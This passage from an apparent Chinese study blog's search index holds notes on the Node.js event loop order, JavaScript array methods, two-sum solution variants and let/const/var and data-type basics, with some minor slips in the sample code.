class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">console.time(&#x27;start&#x27;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  console.log(2);</span><br><span class="line">&#125;, 10);</span><br><span class="line"></span><br><span class="line">setImmediate(function() &#123;</span><br><span class="line">  console.log(1);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">  console.log(3);</span><br><span class="line">  resolve();</span><br><span class="line">  console.log(4);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">  console.log(5);</span><br><span class="line">  console.timeEnd(&#x27;start&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(6);</span><br><span class="line"></span><br><span class="line">process.nextTick(function() &#123;</span><br><span class="line">  console.log(7);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(8);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考答案：<br>综合的执行顺序就是：3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2<br><strong>解析：</strong><br>主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）<br>process.nextTick: 输出7<br>promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’)<br>setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时<br>setTimeout ： 输出2</p><p>本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：<br>所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)<br>在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务<br>一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行<br>主线程不断重复上面的第三步<br>在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。</p><p>宏任务 Macrotask宏任务是指Event Loop在每个阶段执行的任务<br>微任务 Microtask微任务是指Event Loop在每个阶段之间执行的任务<br>我们举例来看执行顺序的规定，我们假设<br>宏任务队列包含任务: A1, A2 , A3<br>微任务队列包含任务: B1, B2 , B3<br>执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。<br>了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：<br><font color="#FF8C00">宏任务 Macrotask队列真实包含任务</font>：script(主程序代码),setTimeout, setInterval, setImmediate, I/O, UI rendering<br><font color="#FF8C00">微任务 Microtask队列真实包含任务</font>: process.nextTick, Promises, Object.observe, MutationObserver<br><font color="#FF00FF">在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs</font></p><p><font color="#DC143C">script(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate</font></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法之数组</title>
      <link href="/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84(1)/"/>
      <url>/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84(1)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址 <a href="https://blog.csdn.net/Dandrose/article/details/123483066">blog.csdn.net</a></p></blockquote><p>MDN 参考文档： <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array" title="Array - JavaScript | MDN">Array - JavaScript | MDN</a><br><strong>①数组检测</strong><br>var colors = [‘red’, ‘blue’, ‘green’]<br>ECMAScript5 新增 Array.isArray() 方法，目的是最终确定某个值到底是不是<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>：<br>if (Array.isArray(colors)) {<br>        // 对数组执行某些操作<br>}<br><strong>②数组转换</strong><br>var colors = [‘red’, ‘blue’, ‘green’]<br>console.log(colors.toString()) // ‘red,blue,green’，返回数组中每个值的字符串形式拼接成的以逗号分隔的字符串。<br>console.log(colors.valueOf()) // [‘red’, ‘blue’, ‘green’]，返回的是数组本身<br>数组继承的 toLocalString()、toString() 和 valueOf() 方法，在默认情况下，都会以逗号分隔的字符串形式返回数组项。<br>而使用 join() 方法，可以使用不同的分隔符来构建这个字符串。<br>join() 方法只接收一个参数：用作分隔符的字符串<br>console.log(colors.join(‘,’)) // red,green,blue<br>console.log(colors.join(‘’)) // redgreenblue<br>console.log(colors.join(‘||’)) // red||green||blue<br>若不给 join() 方法传递任何值，或者给它传入 undefined，则使用逗号作为分隔符。<br><strong>③数组的栈方法（<strong><strong>LIFO</strong></strong>，<strong><strong>Last-In-First-Out</strong></strong>，<strong><strong>后进先出</strong></strong>的数据结构）</strong><br>栈的插入和移除，只发生在栈的顶部。<br>1.push()：可以接收任意数量的参数，将其逐个添加到数组末尾，并返回修改后数组的长度<br>2.pop()：从数组末尾移除最后一项，减少数组的 length，返回移除的项<br>var colors = new Array() // create an array<br>var count = colors.push(‘red’, ‘green’) // 插入两项<br>console.log(count) // 2<br>count = colors.push(‘black’) // 插入另一项<br>console.log(count) // 3<br>var item = colors.pop() // 取得最后一项<br>console.log(item) // ‘black’<br><strong>④<strong><strong>数组的队列方法（</strong></strong>FIFO<strong><strong>，</strong></strong>First-In-First-Out****，先进先出的数据结构）</strong><br>队列在列表的末端添加项，从列表的前端移除项。可以使用以下两种组合，像使用队列一样使用数组：<br>1.shift()：移除数组中的第一项并返回该项，同时数组 length 减 1<br>var colors = [‘red’, ‘blue’, ‘green’]<br>var item = colors.shift() // 取得第一项<br>console.log(item) // ‘red’<br>console.log(colors.length) // 2<br>2.unshift()：在数组前端<font color="#FF8C00">添加</font>任意个项并<font color="#FF8C00">返回新数组的长度</font><br>var colors = new Array() // create an array<br>var count = colors.unshift(“red”, “green”) // 插入两项<br>console.log(count);  // 2<br><strong>⑤数组排序方法</strong><br>1.reverse()：翻转数组<br>var values = [1,2,3,4,5]<br>console.log(values.reverse()) // [5, 4, 3, 2, 1]，翻转数组的顺序<br>2.sort()：对数组进行排序<br>默认情况下，sort() 方法按<font color="#FF8C00">升序</font>排列数组项——即最小的值位于最前面。为了实现排序，sort() 方法会调用每个数组项的<font color="#FF8C00"> toString() 转型方法，然后比较得到的字符串</font>，<font color="#FF00FF">即使数组项是数值，sort() 方法比较的也是字符串</font><br>var values = [0, 1, 15, 5, 10]<br>console.log(values.sort()) // 0,1,10,15,5  默认进行<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>比较，所有 10 和 15 都在 5 的前面<br>若想通过 sort() 得到降序或者升序，可以传递一个<font color="#bf242a">比较函数</font><br>console.log(values.sort((a, b) =&gt; a - b))<br>function compare (a, b) {<br> <strong>return a - b // 升序</strong><br> <strong>return b - a // 降序</strong><br>}<br>function compare (a, b) {  <strong>//</strong> <strong>升序</strong><br>        if (a &lt; b) {<br>                return -1<br>        } <strong>else if (a&gt; b) {</strong><br> <strong>return 1</strong><br>        } else {<br>                0<br>}<br>function compare (a, b) {  <strong>//</strong> <strong>降序</strong><br> **if (a &lt; b) {**<br> **return 1**<br>        } else if (a&gt; b) {<br>                return -1<br>        } else {<br>                0<br>        }<br>}</p><p><strong>⑥数组****操作方法</strong><br>1.concat()：<font color="#FF00FF">基于当前数组中的所有项创建一个新数组</font></p><ul><li>  在没有传参时，<font color="#FF00FF">它只是复制当前数组并返回副本</font></li><li>  如果传递的<font color="#FF00FF">是 1 个或多个数组，则会将这些数组中的每一项都添加到结果数组中</font></li><li>  如果传递的值不是数组，这些值就会被简单地<font color="#FF00FF">添加到结果数组的末尾</font><br>var colors = [‘red’, ‘green’, ‘blue’]<br>var colors2 = colors.concat(‘yellow’, [‘black’, ‘brown’])<br>console.log(‘colors2:’, colors2) // [‘red’, ‘green’, ‘blue’, ‘yellow’, ‘black’, ‘brown’]</li></ul><p>2.slice()：**<font color="#FF00FF">不改变原数组</font><strong>，</strong><font color="#FF00FF">返回一个新的数组</font>**，包含从 start 到 end （不包括该元素）的 元素<br>slice() 方法可从已有的数组中返回选定的元素。<br>slice() 方法可提取字符串的某 2 个部分，并以新的字符串返回被提取的部分。<br><strong>注意：</strong> slice() 方法不会改变原始数组。<br><strong>语法：</strong>array.slice(start, end)</p><table cellspacing="0"><tbody><tr><td><p><strong>参数</strong></p></td><td><p><strong>描述</strong></p></td></tr><tr><td><p><em>start</em></p></td><td><p><strong>可选</strong>。规定从何处开始选取。如果是负数，那么它规定从数组尾部开始算起的位置。如果该参数为负数，则表示从原数组中的倒数第几个元素开始提取，<strong>slice(-2)</strong> 表示提取原数组中的倒数第二个元素到最后一个元素（包含最后一个元素）。</p></td></tr><tr><td><p><em>end</em></p></td><td><p><strong>可选</strong>。规定从何处结束选取。该参数是数组片断结束处的数组下标。如果没有指定该参数，那么切分的数组包含从 start 到数组结束的所有元素。如果该参数为负数， 则它表示在原数组中的倒数第几个元素结束抽取。 slice(-2,-1) 表示抽取了原数组中的倒数第二个元素到最后一个元素（不包含最后一个元素，也就是只有倒数第二个元素）。</p></td></tr></tbody></table><ul><li>  只有一个参数时：返回从该参数指定位置开始到当前数组末尾的所有项。</li><li>  有两个参数时：返回起始和结束位置之间的项，<font color="#FF00FF">不包括结束位置的项</font>。</li></ul><p>var nums = [1, 2, 3, 4, 5]<br>var nums1 = nums.slice(1) // 2, 3, 4, 5<br>var nums2 = nums.slice(1, 4) // 2, 3, 4</p><p>3.splice()：算是最强大的数组方法，主要用途是向数组的中部插入项。</p><ul><li>  删除任意数量的项，2 个参数<br>splice(0,2); <strong>// 0<strong><strong>：要删除的第一项位置；</strong></strong>2****：要删除的项数</strong></li><li>  插入指定位置任意数量的项，3 个参数<br>splice(2, 0, ‘red’, ‘green’) <strong>// 2<strong><strong>：起始位置；</strong></strong>0****：要删除的项数；要插入的项</strong></li><li>  替换，向指定位置插入任意数量的项，同时删除任意数量的项，3 个参数<br>splice(2, 1, ‘red’, ‘green’) <strong>// 2<strong><strong>：起始位置；</strong></strong>1****：要删除的项数；要插入的任意数量的项</strong><br>splice() 方法**<font color="#FF00FF">会改变原数组</font>** ，<font color="#FF8C00">同时返回一个数组，包含从原始数组中删除的项，若未删除，则返回一个空数组</font>。</li></ul><p>var colors = [‘red’, ‘green’, ‘blue’]<br><strong>var removed = colors.splice(0,1) //</strong> <strong>删除第一项</strong><br>alert(colors) // [‘green, blue’]<br>alert(removed) // [‘red’]，<font color="#FF8C00">返回数组中只包含一项</font></p><p>4.flat()：参数默认值为 1，按照一个可指定的深度递归遍历数组，并将所有元素与遍历到的子数组中的元素合并为一个新数组返回<br>var nums = [1, 2, [3, [4]], 5]<br>console.log(nums.flat(0)) // [1, 2, [3, [4]], 5]<br>console.log(nums.flat(1)) // [1, 2, 3, [4], 5]<br>console.log(nums.flat(2)) // [1, 2, 3, 4, 5]</p><p><strong>⑦数组位置方法</strong><br>indexOf() 和 lastIndexOf() 均接收两个参数：<br>Ⅰ. 要查找的项<br>Ⅱ.（可选）表示查找起点位置的索引</p><p>两个方法查找成功都返回该项在数组中的位置，<font color="#FF8C00">没找到时返回 -1</font></p><p>1.indexOf()：从数组的开头 (位置 0) 开始向后查找<br>var numbers = [1, 2, 3, 4, 5, 4, 3, 2, 1]<br>console.log(numbers.indexOf(4)) // 3<br>console.log(numbers.indexOf(4, 4)) // 5</p><p>2.lastIndexOf()：从数组的末尾开始向前查找<br>console.log(numbers.lastIndexOf(4)) // 5<br>console.log(numbers.lastIndexOf(4, 4)) // 3</p><p>3.at()：方法<font color="#FF00FF">接收一个整数值并返回该索引的项目</font>，允许正数和负数。<font color="#FF00FF">负整数从数组中的最后一个项目开始倒数。</font></p><p>var nums = [1, 2, 3, 4, 5]<br>console.log(nums.at(0)) // 1<br>console.log(nums.at(1)) // 2<br>console.log(nums.at(-1)) // 5</p><p><strong>⑧****数组归并方法</strong></p><p>ECMAScript5 新增了两个归并数组的方法：reduce() 和 reduceRight()</p><p>这两个方法都接收<font color="#FF8C00">两个</font>参数：</p><p>Ⅰ. 在<font color="#FF8C00">每一项上调用的函数</font>。<br>Ⅱ.（可选）<font color="#FF8C00">作为归并基础的初始值</font>。</p><p>传给这两个方法的函数接收 <font color="#FF00FF">4</font> 个参数：</p><p>Ⅰ.acc 累计器（<font color="#FF8C00">累计回调的返回值，是上一次调用回调时返回的累积值</font>）<br>Ⅱ.cur 当前值<br>Ⅲ.index 当前值的索引<br>Ⅳ.array 数组对象</p><p>1.reduce()：从数组第一项开始，逐个遍历到最后<br>方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。</p><p>reduce() 可以作为一个高阶函数，用于函数的 compose。<br>注意:<font color="#FF00FF"> reduce() 对于空数组是不会执行回调函数的</font>。</p><p>语法：array.reduce(function(total, currentValue, currentIndex, arr), initialValue)</p><table cellspacing="0"><tbody><tr><td><p><strong>参数</strong></p></td><td><p><strong>描述</strong></p></td></tr><tr><td><p><em>function(total,currentValue, index,arr)</em></p></td><td><p>必需。用于执行每个数组元素的函数。</p><p>函数参数:</p><table cellspacing="0"><tbody><tr><td><p><strong>参数</strong></p></td><td><p><strong>描述</strong></p></td></tr><tr><td><p><strong>total</strong></p></td><td><p>必需。初始值, 或者计算结束后的返回值。</p></td></tr><tr><td><p><strong>currentValue</strong></p></td><td><p>必需。当前元素</p></td></tr><tr><td><p>currentIndex</p></td><td><p>可选。当前元素的索引</p></td></tr><tr><td><p>arr</p></td><td><p>可选。当前元素所属的数组对象。</p></td></tr></tbody></table></td></tr><tr><td><p><em>initialValue</em></p></td><td><p>可选。传递给函数的初始值</p></td></tr></tbody></table><ul><li>  直接对数组值进行累加</li></ul><p>var nums = [1, 2, 3, 4, 5]<br>var result = nums.<strong>reduce</strong>((a, b) =&gt; a + b, 10) // 10 为初始值<br>console.log(‘result:’, result) // 累加结果：25<br>var sum = nums.reduce((pre, cur) =&gt; {<br>      return pre + cur<br>}, 10) // 10 为pre初始值<br>console.log(sum) // 25</p><ul><li>  对数组值先进行四舍五入，然后再进行累加</li></ul><p>var nums = [1.1, 2.2, 3.3, 4.4, 5.5]<br>var result = nums.<strong>reduce</strong>((a, b) =&gt; a + Math.round(b), <strong>0.5</strong>)<br>console.log(‘result:’, result) // 此时 0.5 作为初始累加结果，数组所有项四舍五入累加，最终结果为：16.5</p><p>2.reduceRight()：从数组的最后一项开始，向前遍历到第一项</p><p><strong>⑨数组迭代方法</strong></p><p>传入这些方法中的函数<font color="#FF8C00">均会接收 3 个参数</font>：<br>Ⅰ.item（必须）：数组项的值<br>Ⅱ.index（可选）：该项在数组中的位置<br>Ⅲ.array（可选）：数组对象本身</p><p>var typeKey = [0, 1, 2, 3, ‘’]</p><ol><li>filter()：<strong>返回该<font color="#FF00FF">函数会返回 true 的项组成的数组</font>（常用于过滤空数组项</strong>）</li></ol><p><strong>typeKey= typeKey.filter</strong>(item =&gt; {<br>                return item !== ‘’<br>        })<br>console.log(‘typeKey:’, typeKey) // [0, 1, 2, 3]</p><ol start="2"><li>forEach()：<strong>对数组每一项执行一遍回调函数（<font color="#FF8C00">没有返回值</font>）</strong></li></ol><p><strong>typeKey**</strong>.**<strong>forEach</strong>(item =&gt; {<br>        if (item) {<br>                console.log(item)<br>        }<br>})</p><p>3.map()：<strong>返回每次<font color="#FF00FF">函数调用的结果组成的数组</font>（常用于处理数组项</strong>）</p><p>map() 方法：</p><ol><li>返回一个<font color="#FF00FF">新数组</font>，数组中的元素为原始数组元素调用函数处理后的值。</li><li>按照原始数组元素顺序依次处理元素。</li></ol><p>注意： map() <font color="#FF00FF">不会对空数组进行检测</font>。<br>注意： map() <font color="#FF00FF">不会改变原始数组</font>。</p><p><strong>var result = typeKey**</strong>.**<strong>map</strong>(item =&gt; {<br>        if (item) {<br>                return 1<br>        } else {<br>                return 0<br>        }<br>})<br>console.log(‘result:’, result) // [0, 1, 1, 1, 0]</p><p>按条件删除数组某些的对象中的某些字段</p><p><img src="https://img-blog.csdnimg.cn/0ab7bfc1c5234f078655de1bb376c821.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAdGhlTXVzZUNhdGNoZXI=,size_15,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>this.types.map(item =&gt; {</strong><br> <strong>if (item.value === ‘2’) {</strong><br> <strong>return delete item.value</strong><br> <strong>} else {</strong><br> <strong>return item</strong><br> <strong>}</strong><br><strong>})</strong></p><p>console.log(‘types:’, this.types)</p><p><img src="https://img-blog.csdnimg.cn/a679c094eec34144b4dc3b14331227ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAdGhlTXVzZUNhdGNoZXI=,size_15,color_FFFFFF,t_70,g_se,x_16"></p><p>4*. every()*：**用于检测数组所有元素是否都符合指定条件（通过函数提供）。</p><p>every() 方法使用指定函数检测数组中的所有元素：</p><ul><li>  如果数组中检测到有<font color="#FF00FF">一个元素不满足，则整个表达式返回 false ，且剩余的元素不会再进行检测</font>。</li><li>  如果所有元素都满足条件，则返回 true。</li></ul><p>注意： <font color="#FF00FF">every() 不会对空数组进行检测</font>。<br>注意： <font color="#FF00FF">every() 不会改变原始数组</font>。</p><p>语法：array.every(function(currentValue,index,arr), thisValue)</p><p><strong>var result = typeKey.every</strong>((item, index, array) =&gt; {<br>                return item&gt;2<br>        }) // 数组所有项均大于 2，即都返回 true，则最后返回 true</p><p><strong>5**</strong>.some()**<strong>：</strong>用于检测数组中的元素是否满足指定条件（函数提供）</p><p>some() 方法会依次执行数组的每个元素：</p><ul><li>  如果<font color="#FF8C00">有一个元素满足条件，则表达式返回 true , 剩余的元素不会再执行检测。</font></li><li>  如果没有满足条件的元素，则返回 false。</li></ul><p>注意： <font color="#FF00FF">some() 不会对空数组进行检测</font>。<br>注意：<font color="#FF00FF"> some() 不会改变原始数组</font>。</p><p>语法：array.some(function(currentValue,index,arr),thisValue)</p><p><strong>var result = typeKey.some</strong>((item, index, array) =&gt; {<br>                return item&gt;2<br>        }) // 数组存在大于 2 的项，则最后返回 true</p><p><strong>var result = typeKey.some(item =&gt; item &gt; 2)</strong><br>console.log(‘result:’, result) // true</p><p><strong>6**</strong>.**<strong>find()：</strong><font color="#FF00FF">返回通过测试（函数内判断）的数组的第一个元素</font></p><p>find() 方法为数组中的每个元素都调用一次函数执行：</p><ul><li>  当数组中的元素在测试条件时返回 true 时,<font color="#FF00FF"> find() 返回符合条件的元素，之后的值不会再调用执行函数</font>。</li><li>  如果<font color="#FF00FF">没有符合条件的元素返回 undefined</font></li></ul><p>注意: <font color="#FF00FF">find() 对于空数组，函数是不会执行的。</font><br>注意: <font color="#FF00FF">find() 并没有改变数组的原始值</font>。</p><p>语法：array.find(function(currentValue, index, arr),thisValue)</p><p>var types = [<br>        {<br>                name: ‘单选题’,<br>                value: 1<br>        },<br>        {<br>                name: ‘多选题’,<br>                value: 2<br>        },<br>        {<br>                name: ‘判断题’,<br>                value: 3<br>        }<br>]</p><p>var result = <strong>types.find(item =&gt; item.value === 3)</strong><br>console.log(‘result:’, result)</p><p><img src="https://img-blog.csdnimg.cn/5010af92e37f4ccc905b4599b94abd30.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAdGhlTXVzZUNhdGNoZXI=,size_14,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>7**</strong>.findIndex()**：返回传入一个测试条件（函数）符合条件的数组第一个元素的<font color="#FF00FF">位置索引</font>。</p><p>findIndex() 方法为数组中的每个元素都调用一次函数执行：</p><ul><li>  当数组中的元素在测试条件返回 true 时, findIndex() 返回符合条件的元素的索引位置，<font color="#FF00FF">之后的值不会再调用执行函数</font>。</li><li>  如果没有符合条件的元素返回 -1</li></ul><p><font color="#FF00FF">注意: findIndex() 对于空数组，函数是不会执行的。<br>注意: findIndex() 并没有改变数组的原始值。</font></p><p>语法：array.findIndex(function(currentValue, index, arr), thisValue)</p><p>var types = [<br>        {<br>                name: ‘单选题’,<br>                value: 1<br>        },<br>        {<br>                name: ‘多选题’,<br>                value: 2<br>        },<br>        {<br>                name: ‘判断题’,<br>                value: 3<br>        }<br>]</p><p>var result = <strong>types.find**<strong>Index</strong></strong>(item =&gt; item.value === 3)**<br>console.log(‘result:’, result) // 索引：2</p><p><strong>8.for…<strong><strong>，</strong></strong>for…of 和 for…in</strong></p><p>var nums = [1, 2, 3, 4]<br>for (let i = 0; i &lt; str.length; i++) {<br>      console.log(str[i]) // 字符串每项的值<br>}</p><p>for (const n of nums) {<br>      console.log(‘item:’, n) // 数组<font color="#FF8C00">每项的值</font><br>}</p><p>for (const i in nums) {<br>      console.log(‘index:’, ‘i) // 数组每项的<font color="#FF00FF">索引下标（string 类型）</font><br>}</p><p>**⑩includes()**<strong>：</strong>用来判断一个数组是否包含一个指定的值（或者<font color="#FF8C00">判断字符串是否包含指定的子字符串</font>），如果是<font color="#FF00FF">返回 true，否则 false</font></p><p>var nums = [1, 2, 3]<br>nums.includes(2) // true<br>num.includes(4) // false</p><p>var site = [‘runoob’, ‘google’, ‘taobao’]<br>site.includes(‘runoob’) // true<br>site.includes(‘baidu’) // false</p><p><strong>数组的拷贝</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array.slice(0); //返回数组的拷贝数组，注意是一个新的数组，不是指向</span><br><span class="line">array.concat(); //返回数组的拷贝数组，注意是一个新的数组，不是指向</span><br></pre></td></tr></table></figure><p><strong>数组元素的字符串化</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array.join(separator); //返回字符串，这个字符串将数组的每一个元素值连接在一起，中间用 separator 隔开。</span><br><span class="line"> </span><br><span class="line">toLocaleString 、toString 、valueOf：可以看作是join的特殊用法，不常用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法之数组（2）</title>
      <link href="/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84%EF%BC%882%EF%BC%89/"/>
      <url>/2022/08/02/%E7%AE%97%E6%B3%95%E4%B9%8B%E6%95%B0%E7%BB%84%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="实例题"><a href="#实例题" class="headerlink" title="实例题"></a>实例题</h1><blockquote><p>// 给定一个整数数组 nums和一个目标值 target，<br>// 请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。<br>// 你可以假设每种输入只会对应一个答案。<br>// 但是，你不能重复利用这个数组中同样的元素。<br>// 示例:<br>//    给定 nums = [2, 7, 11, 15], target = 9;<br>//    因为 nums[0] + nums[1] = 2 + 7 = 9,<br>//    所以返回 [0, 1]。</p></blockquote><h1 id="暴力双-for-循环解法"><a href="#暴力双-for-循环解法" class="headerlink" title="暴力双 for 循环解法"></a>暴力双 for 循环解法</h1><p><img src="https://files.shanqianche.cn/20228/1659450770164.png" alt="暴力双 for 循环破解"><br><font color="#FF00FF">时间复杂度</font>：O(n^2),可能看似感觉还不错，但是执行时间长，内存占用也不小，当 nums 数组足够大时，它的性能瓶颈就会体现出来。</p><p><img src="https://files.shanqianche.cn/20228/1659453577804.png" alt="res"></p><h1 id="单循环-indexOf-优化"><a href="#单循环-indexOf-优化" class="headerlink" title="单循环 indexOf 优化"></a>单循环 indexOf 优化</h1><p><img src="https://files.shanqianche.cn/20228/1659452119737.png" alt="单循环 indexOf 优化"></p><p><font color="#FF00FF">时间复杂度：</font>O(n^2),因为 indexOf()方法的时间复杂度为 O(n),所以和上述暴力破解只是写法上区别了。执行时间，内存占用依然存在可优化的空间。</p><p><img src="https://files.shanqianche.cn/20228/1659453595273.png" alt="res"></p><h1 id="单循环-obj-优化"><a href="#单循环-obj-优化" class="headerlink" title="单循环 obj 优化"></a>单循环 obj 优化</h1><p><img src="https://files.shanqianche.cn/20228/1659453540413.png" alt="单循环 obj 优化"><br><font color="#FF00FF">时间复杂度：</font>O(n),由于对象键值对 key-value 的优越性，对于作为查找类的算法很有优势。时间复杂度降为原有的一倍，性能会好一些。</p><p><img src="https://files.shanqianche.cn/20228/1659453608333.png" alt="res"></p><h1 id="单循环-map-优化"><a href="#单循环-map-优化" class="headerlink" title="单循环 map 优化"></a>单循环 map 优化</h1><p><img src="https://files.shanqianche.cn/20228/1659454347806.png" alt="单循环 map 优化"><br><font color="#FF00FF">时间复杂度：</font>O(2n),第一次循环时间度 n,第二次为 n*1，故为 O(2n), 由于 map 的特殊数据结构，故作为查找类的算法，相比 obj 具有绝对优势。</p><p><img src="https://files.shanqianche.cn/20228/1659454447460.png" alt="res"></p><h1 id="单循环尾递归优化"><a href="#单循环尾递归优化" class="headerlink" title="单循环尾递归优化"></a>单循环尾递归优化</h1><p><img src="https://files.shanqianche.cn/20228/1659454936694.png" alt="obj 尾递归优化"><br><font color="#FF00FF">时间复杂度：</font>O(n),假设我们查找到,则递归的次数应该是最多的为 n，所以时间复杂度 O(n); 递归相比于 for 循环是一种更近层次的查找，在树结构数据、多维数组中我们常用递归思想来处理数据。</p><p><img src="https://files.shanqianche.cn/20228/1659454979758.png" alt="res"></p><p><img src="https://files.shanqianche.cn/20228/1659455431271.png" alt="map 尾递归优化破解"><br><font color="#FF00FF">时间复杂度：</font>O(n),假设我们查找到,则递归的次数为 n，所以时间复杂度也为 O(n);</p><p><img src="https://files.shanqianche.cn/20228/1659455479861.png" alt="res"></p><p><font color="#bf242a">在面试中与实际工作中，简单数组算法的几点经验之谈：</font><br>数组去重：使用单循环，结合 obj 或 map 做中间辅助判断； 数组扁平化：使用递归；<br>树结构的查找与处理：单循环使用 obj/map 做中间辅助判断，同时结合递归思想；<br>数组的特定重组：除了上述思想外，可能要结合数组常用方法：indexOf(),map(),forEach()或数组高阶函数 filter(),reduce(),sort(),every(),some()等。</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础(第二天)</title>
      <link href="/2022/07/26/JavaScript%E5%9F%BA%E7%A1%80(%E7%AC%AC%E4%BA%8C%E5%A4%A9)/"/>
      <url>/2022/07/26/JavaScript%E5%9F%BA%E7%A1%80(%E7%AC%AC%E4%BA%8C%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="基础定义"><a href="#基础定义" class="headerlink" title="基础定义"></a>基础定义</h1><ol><li>let const var 相关</li></ol><p>var ——ES5 变量声明方式</p><p>在变量未赋值时，变量undefined（为使用声明变量时也为undefined）<br>作用域——var的作用域为<font color="#FF8C00">函数方法作用域</font>；只要在方法内定义了，整个方法内的定义变量后的代码都可以使用<br>let——ES6变量声明方式<br><font color="#FF8C00">在变量为声明前直接使用会报错</font><br>作用域——let为<font color="#FF8C00">块作用域</font>——通常let比var 范围要小<br><font color="#FF00FF">let禁止重复声明变量，否则会报错；var可以重复声明</font><br>const——ES6变量声明方式<br>1.const为常量声明方式；<font color="#FF8C00">声明变量时必须初始化，在后面出现的代码中不能再修改该常量的值</font><br>2.const实际上保证的，并不是变量的值不得改动，<font color="#FF00FF">而是变量指向的那个内存地址不得改动</font></p><ol start="2"><li>js数据类型，区别</li></ol><p>基本数据类型：<br>Number，String，Boolean，null，undefined，symbol，bigint（后两个为ES6新增）<br>引用数据类型：<br>object，function（proto Function.prototype）<br>object：<font color="#FF8C00">普通对象，数组对象，正则对象，日期对象，Math数学函数对象</font>。<br>两种数据存储方式：<br>基本数据类型是直接存储在<font color="#FF8C00">栈中的简单数据段，占据空间小、大小固定，属于被频繁使用的数据</font>。<font color="#FF00FF">栈是存储基 本类型值和执行代码的空间</font>。<br>引用数据类型是存储<font color="#FF8C00">在堆内存中</font>，占据空间大、大小不固定。引用数据类型在<font color="#FF8C00">栈中存储了指</font>针，该指针指向堆 中该实体的起始地址，<font color="#FF8C00">当解释器寻找引用值时，会检索其在栈中的地址，取得地址后从堆中获得实体</font>。<br>两种数据类型的区别：</p><ul><li><font 